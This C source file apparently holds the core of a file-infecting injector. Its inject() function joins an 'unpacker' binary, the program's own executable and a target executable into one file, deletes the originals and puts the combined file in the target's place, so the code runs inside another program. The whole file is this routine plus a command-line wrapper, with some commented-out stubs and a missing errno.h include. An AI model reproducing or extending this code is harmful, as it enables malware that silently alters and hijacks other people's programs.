#include <stdio.h>
#include <string.h>
#include <stdbool.h>


#include "utils.c"


// #ifdef __linux__ 
//     #include <>
// #elif _WIN32
//     #include <Windows.h>
// #else
//     #error Unsupported platform
// #endif



// 
// int handle_error(void) {
//     #if
// }


bool inject(const char *unpacker_path, const char *self_path, const char *target_path) {
    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    const char *tmp_path = tmpnam(NULL);
    if (tmp_path == NULL)
        return false;

    FILE *tmp_file = fopen(tmp_path, "wb");
    if (tmp_file == NULL)
        return false;
    
    if (!read_into_file(unpacker_path, tmp_file, -1))
        return false;

    if (remove(unpacker_path))
        return false;
    
    if (!read_into_file(self_path, tmp_file, -1))
        return false;
    
    if (!read_into_file(target_path, tmp_file, -1))
        return false;

    if (fclose(tmp_file) == EOF)
        return false;

    if (remove(target_path))
        return false;

    if (rename(tmp_path, target_path))
        return false;
    
    return true;
}


int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "ValueError: missing UNPACKER and TARGET executables.");
        return 1;
    }

    if (!inject(argv[1], argv[0], argv[2])) {
        perror(strerror(errno));
        return 1;
    }

    return 0;
}

